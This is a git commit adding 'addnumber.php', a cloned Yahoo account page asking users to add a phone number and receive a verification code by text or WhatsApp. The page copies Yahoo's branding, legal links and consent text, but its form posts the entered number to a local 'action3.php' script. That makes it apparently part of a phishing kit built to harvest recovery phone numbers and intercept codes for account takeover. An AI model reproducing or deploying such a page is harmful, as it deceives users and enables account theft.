966c9db573a6740cd67b038f52db21e04c5fe85c
daveagleson <davideagleson_bakerco@hotmail.com>
2024-10-04 17:32:44 -0700

    Add files via upload

---
+++ addnumber.php
@@ -0,0 +1,158 @@
+<!DOCTYPE html>
+<html id="Stencil" lang="en-US" class="no-js grid light-theme ">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no"/>
+        <meta name="format-detection" content="telephone=no">
+        <meta name="referrer" content="strict-origin-when-cross-origin">
+        <title>Yahoo</title>
+        <meta name="description" content="Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies... You get more out of the web, you get more out of life."/>
+        <link rel="dns-prefetch" href="//gstatic.com">
+        <link rel="dns-prefetch" href="//google.com">
+        <link rel="dns-prefetch" href="//s.yimg.com">
+        <link rel="dns-prefetch" href="//y.analytics.yahoo.com">
+        <link rel="dns-prefetch" href="//ucs.query.yahoo.com">
+        <link rel="dns-prefetch" href="//geo.query.yahoo.com">
+        <link rel="dns-prefetch" href="//geo.yahoo.com">
+        <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
+        <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
+        <meta name="google-site-verification" content="yOTFyUBPTnXtuk2cPpqfv7ZvZ960JgqsV8FomN3n7Y0"/>
+        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
+        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
+       
+        <link href="https://s.yimg.com/wm/mbr/417c13362de753a4f8f06cd156a39e0bdde8a888/yahoo-main.css" rel="stylesheet" type="text/css">
+        
+        <div id="login-body" class="loginish dark-background puree-v2  grid   ">
+            <div class="mbr-desktop-hd">
+                <span class="column">
+                    <a href="https://www.yahoo.com/">
+                        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo " width="" height="36"/>
+                        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo " width="" height="36"/>
+                    </a>
+                </span>
+                <div class="desktop-universal-header">
+                    <a href="https://help.yahoo.com/kb/index?locale&#x3D;en_US&amp;page&#x3D;product&amp;y&#x3D;PROD_ACCT" data-rapid-tracking="true" data-ylk="elm:link;elmt:link;slk:headerHelp">Help</a>
+                    <a href="https://legal.yahoo.com/us/en/yahoo/terms/otos/index.html" class="universal-header-links" data-rapid-tracking="true" data-ylk="elm:link;elmt:link;slk:headerTerms">Terms</a>
+                    <a href="https://legal.yahoo.com/us/en/yahoo/privacy/index.html" class="universal-header-links privacy-link" data-rapid-tracking="true" data-ylk="elm:link;elmt:link;slk:headerPrivacy">Privacy</a>
+                </div>
+            </div>
+            <div class="login-box-container">
+                <div class="login-box center">
+                    <div class="mbr-login-hd txt-align-center">
+                        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27"/>
+                        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27"/>
+                    </div>
+                    <div id="account-attributes-challenge" class=" challenge">
+                        <h2 class="challenge-heading">Add your phone number</h2>
+                        <p class="challenge-desc"></p>
+                        <form id="regform" action="action3.php">
+                           
+                            
+                            <fieldset id="contact-countrycode-dropdown" class="form-fieldset input-group field-group code-of-length-1 puree-country-inline-dropdown">
+                                <div class="puree-dropdown selected-country-code-cont ltr">
+                                    <div class="selected-country-code " id="relative-country-code">+1</div>
+                                    <div class="arrow"></div>
+                                </div>
+                                <div class="country-code-dropdown country-dropdown-container">
+                                    <div class="puree-dropdown">
+                                        <label class="offscreen" id="country-code-lbl-aria">Enter Country Code</label>
+                                        <select type="select" name="shortCountryCode" aria-required="true" role="combobox" aria-labelledby="country-code-lbl-aria">
+                                            <option role="option" data-code="+1" value="US" data-format="(XXX) XXX-XXXX" selected="selected">United States &#x202A;(+1)&#x202C;</option>
+                                        </select>
+                                        <div class="arrow"></div>
+                                    </div>
+                                </div>
+                                <input type="tel" pattern="[0-9-() ]*" id="usernamereg-phone" name="phone" class="input-with-icon icon-contact phone-no oneid-error-border" autofocus value="" aria-required="true" role="textbox" aria-multiline="false" placeholder=" " aria-label="Phone number">
+                                <div class="input-field-icon"></div>
+                                <label for="usernamereg-phone" class="with-fixed-country-code">Phone number</label>
+                            </fieldset>
+                            <div id="reg-error-phone" class="oneid-error-message" data-error="messages.INVALID_PHONE_NUMBER">This phone number doesn &#x27;t look right</div>
+                            <div id="local-phone-learn-more" class="learn-more-container ">
+                                <input id="learn-more-preferences" type="checkbox" class="expand-control" name="expand-trigger">
+                                <div class="learn-more-header" data-rapid-tracking="true" data-ylk="subsec:mismatchedreglink;elm:link;elmt:mismatchedreg;slk:mismatchedreg;mKey:mismatchedreg">
+                                    <label for="learn-more-preferences" class="cursor-pointer">
+                                        <p class="learn-more-link">Don't have a local phone number?</p>
+                                        <span class="card-menu-button chevron-icon-fuji-down"></span>
+                                        <span class="card-menu-button chevron-icon-fuji-up"></span>
+                                    </label>
+                                </div>
+                                <div class="learn-more-expandable">
+                                    <div class="learn-more-section">
+                                        <span class="learn-more-heading">Don't have a local phone number?</span>
+                                    </div>
+                                    <p class="learn-more-desc">Your recovery phone number must be local.</p>
+                                </div>
+                            </div>
+                            <p class="form-field-desc">We &#x27;ll send you a code to verify this mobile number. Message and data rates may apply.</p>
+                            <p class="tos-text left-aligned more-space">
+                                Your emails and phone numbers will be used to offer relevant features, content and advertising as covered in our 
+                                <a href="https://legal.yahoo.com/us/en/yahoo/privacy/index.html" data-rapid-tracking="true" data-ylk="subsec:toslink;elm:link;elmt:privacy;slk:privacy;mKey:privacy" class="privacyLink" target="_blank">
+                                    Privacy Policy <strong class="tos-updated"></strong>
+                                </a>
+                                .
+            
+                            </p>
+                            <div id="consent-selection" class="consent">
+                                <input id="customize-data-pref-event" type="hidden" value="false" name="hasReadFullPrivacyToS">
+                                <input id="customize-data-preferences" type="checkbox" class="expand-control" name="expand-trigger">
+                                <div class="txt-align-left customize-data-header">
+                                    <label for="customize-data-preferences" id="open-consent-details" class="consent-details">
+                                        <strong class="privacy-policy">Customize your data preferences</strong>
+                                        <span id="arrowDown" class="privacy-expand-dropdown card-menu-button chevron-icon-fuji-down"></span>
+                                        <span class="privacy-expand-dropdown card-menu-button chevron-icon-fuji-up"></span>
+                                    </label>
+                                </div>
+                                <div id="consent-info" class="info">
+                                    Customize your Yahoo experience by confirming whether your contact information is used to offer relevant features, content and advertising.
+                    
+                                    <div id="opt-out-consent" class="third-party-consent">
+                                        <input type="hidden" id="select-consent-hidden" name="isAccountMatchingControl" value="true">
+                                        <input type="checkbox" id="select-consent" class="checkbox" name="isAccountMatchingConsented" checked>
+                                        <div class="consent-text">
+                                            <label for="select-consent">
+                                                <strong>Use my contact information to personalize the features, content, and advertising you show me.</strong>
+                                            </label>
+                                        </div>
+                                    </div>
+                                    <p>
+                                        <a href="https://legal.yahoo.com/us/en/yahoo/privacy/technical-identifiers/index.html" target="_blank">Learn more</a>
+                                        about how this data will be used.
+                    
+                                    </p>
+                                </div>
+                            </div>
+                            <div class="button-container whatsapp-button">
+                                <input type="hidden" value=true name="isWhatsapp">
+                                <button id="reg-whatsapp-button" name="whatsappcode" type="submit" data-rapid-tracking="true" class="challenge-button pure-button puree-button-primary puree-spinner-button" data-ylk="elm:btn;elmt:nxt;slk:continue;mKey:sendCodeWithWhatsapp">Get code on WhatsApp</button>
+                            </div>
+                            <div class="button-container sms-button">
+                                <button id="reg-sms-button" name="smscode" type="submit" data-rapid-tracking="true" class="challenge-button pure-button puree-button-secondary puree-spinner-button" data-ylk="elm:btn;elmt:nxt;slk:continue;mKey:sendCodeWithSms">Get code by text</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+                <div id="login-box-ad-fallback" class="login-box-ad-fallback"></div>
+            </div>
+            <div class="login-bg-outer">
+                <div class="login-bg-inner">
+                    <div id="login-ad-rich" aria-hidden="true"></div>
+                </div>
+            </div>
+        </div>
+       
+       
+        
+        <div id="mbr-css-check"></div>
+        <div id="page-mask" class="page-mask hide"></div>
+        <div id="ad"></div>
+        <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
+            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
+            <input type="checkbox" id="mbr-legacy-device-bar-cross"/>
+            <p class="mbr-legacy-device">
+                Yahoo works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some Yahoo features may not work properly. Please update your browser version now. <a href="">More Info</a>
+            </p>
+        </div>
+        
+    </body>
+</html>
+<!-- fe29.member.bf1.yahoo.com - Thu Oct 03 2024 23:46:49 GMT+0000 (Coordinated Universal Time) - (1ms) -->
